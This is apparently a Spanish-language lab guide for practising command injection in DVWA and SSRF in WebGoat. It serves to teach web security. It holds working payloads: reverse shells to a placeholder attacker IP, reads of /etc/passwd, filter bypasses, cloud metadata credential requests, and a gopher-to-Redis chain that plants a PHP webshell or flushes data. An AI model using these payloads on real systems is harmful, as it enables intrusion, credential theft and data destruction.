# Lab 06 — SSRF & Command Injection

## Objetivo

Explotar Server-Side Request Forgery (SSRF) para acceder a servicios internos, y Command Injection para ejecutar comandos del sistema operativo desde la aplicación web.

**Apps objetivo:** DVWA (Command Injection) + WebGoat (SSRF)

---

## Parte A — Command Injection

### Conceptos

Command Injection ocurre cuando la aplicación pasa entrada del usuario directamente a una función de shell:

```php
// VULNERABLE
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);

// Si ip = "8.8.8.8; id"
// Shell ejecuta: ping -c 1 8.8.8.8; id
// Resultado: salida del ping + uid=33(www-data)
```

---

### DVWA — Command Injection (Security: Low)

**DVWA → Command Injection**

El campo espera una IP para hacer ping. Inyectar comandos después del separador:

#### Separadores de comandos

| Separador | Comportamiento |
|-----------|---------------|
| `;` | Ejecuta ambos siempre |
| `&&` | Ejecuta el segundo solo si el primero exitoso |
| `\|\|` | Ejecuta el segundo solo si el primero falla |
| `\|` | Pipe — salida del primero como entrada del segundo |
| `` `cmd` `` | Sustitución de comando |
| `$(cmd)` | Sustitución de comando |

#### Payloads básicos

```bash
# En el campo de IP de DVWA:
8.8.8.8; id
8.8.8.8; whoami
8.8.8.8; cat /etc/passwd
8.8.8.8; uname -a
8.8.8.8 && cat /var/www/html/vulnerabilities/exec/source/low.php

# Sin la IP (el ping fallará pero el comando se ejecuta)
; id
| id
`id`
$(id)
```

#### Reverse shell desde Command Injection

```bash
# Listener en tu máquina
nc -lvnp 4444

# Payload en el campo IP (reemplaza TU_IP)
8.8.8.8; bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'

# Alternativas si bash no está disponible
8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (si tiene -e)
8.8.8.8; nc TU_IP 4444 -e /bin/bash
```

---

### Bypass de filtros (Medium)

**DVWA Medium** filtra `&&` y `;`. Usar alternativas:

```bash
# Pipe funciona aunque filtren ; y &&
8.8.8.8 | id
8.8.8.8 | cat /etc/passwd

# Sustitución de comandos
8.8.8.8 `id`

# Insertar caracteres especiales que el shell ignora
8.8.8.8 &;&& id      # si solo filtra && exacto
127.0.0.1 $(id)
```

**DVWA High** filtra más separadores. Probar:

```bash
127.0.0.1|id         # sin espacios
127.0.0.1|cat /etc/passwd
```

---

## Parte B — Server-Side Request Forgery (SSRF)

### Conceptos

SSRF ocurre cuando un servidor realiza peticiones HTTP a una URL controlada por el atacante. Permite:

- Acceder a servicios internos (127.0.0.1, 10.x.x.x)
- Escanear puertos internos
- Leer metadatos de cloud (AWS/GCP/Azure IMDSv1)
- Bypassear firewalls

```
Atacante → [App web] → 127.0.0.1:8080/admin
              ↑
         Servidor hace la petición desde dentro
```

---

### DVWA — SSRF (vía Server Side Request Forgery en File Inclusion)

```bash
# DVWA File Inclusion puede usarse como SSRF básico
http://localhost:8080/vulnerabilities/fi/?page=http://127.0.0.1/

# Leer archivos internos
http://localhost:8080/vulnerabilities/fi/?page=file:///etc/passwd
http://localhost:8080/vulnerabilities/fi/?page=file:///var/www/html/config.inc.php

# Petición a servicios internos
http://localhost:8080/vulnerabilities/fi/?page=http://127.0.0.1:8080/phpmyadmin/
```

---

### WebGoat — SSRF Lessons

```
1. Abrir http://localhost:8888/WebGoat
2. Registrarse (usuario nuevo)
3. Ir a: A7: Server Side Request Forgeries → SSRF
```

#### Payloads SSRF básicos

```bash
# Acceder a localhost
http://127.0.0.1/
http://localhost/
http://[::1]/         # IPv6 loopback

# Acceder a la red interna
http://10.0.0.1/
http://192.168.1.1/admin

# Metadatos AWS (en entornos cloud reales)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Metadatos GCP
http://metadata.google.internal/computeMetadata/v1/

# Leer archivos con file://
file:///etc/passwd
file:///etc/hosts
file:///proc/net/tcp

# Otros protocolos
dict://127.0.0.1:6379/info    # Redis info
gopher://127.0.0.1:25/        # SMTP interno
```

---

### SSRF Blind

Cuando el servidor no devuelve la respuesta, usar un servidor de recepción:

```bash
# En tu máquina
python3 -m http.server 8001

# O usar Burp Collaborator / interactsh
interactsh-client

# El payload SSRF apunta a tu servidor:
http://TU_IP:8001/ssrf-test

# Si el servidor objetivo hace la petición, ves el log
```

---

### Bypass de filtros SSRF

```bash
# Si filtran "127.0.0.1"
http://127.1/                # forma abreviada
http://0x7f000001/           # hexadecimal
http://0177.0.0.1/           # octal
http://2130706433/           # decimal
http://127.0.0.1.nip.io/    # DNS que resuelve a 127.0.0.1

# Si filtran "localhost"
http://LOCALHOST/
http://LocalHost/
http://127.0.0.1/

# Redirección (si hay un open redirect en el mismo servidor)
http://objetivo.com/redirect?url=http://127.0.0.1/admin
```

---

## Caso real: SSRF → RCE en Redis

```bash
# Si Redis está en localhost:6379 sin autenticación
# SSRF puede enviar comandos Redis via protocolo RESP:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# Para escribir una webshell via Redis:
gopher://127.0.0.1:6379/_CONFIG+SET+dir+/var/www/html%0D%0A
gopher://127.0.0.1:6379/_CONFIG+SET+dbfilename+shell.php%0D%0A
gopher://127.0.0.1:6379/_SET+shell+"<?php system($_GET['cmd']);?>" %0D%0A
gopher://127.0.0.1:6379/_BGSAVE%0D%0A
```

---

## Actividades

1. En DVWA (Low), ejecutar `id`, `whoami` y `cat /etc/passwd` via Command Injection
2. Obtener una reverse shell completa desde Command Injection
3. Bypassear el filtro de Medium con un separador alternativo
4. En DVWA File Inclusion, leer `/etc/passwd` via `file://`
5. En WebGoat, completar al menos 2 lecciones de SSRF
6. Documentar bypass de filtros para DVWA High

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Command Injection | T1059.004 — Unix Shell |
| SSRF → Service Discovery | T1046 — Network Service Discovery |
| SSRF → Cloud Metadata | T1552.005 — Cloud Instance Metadata API |
| RCE desde webshell | T1505.003 — Web Shell |

---

## Referencias

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
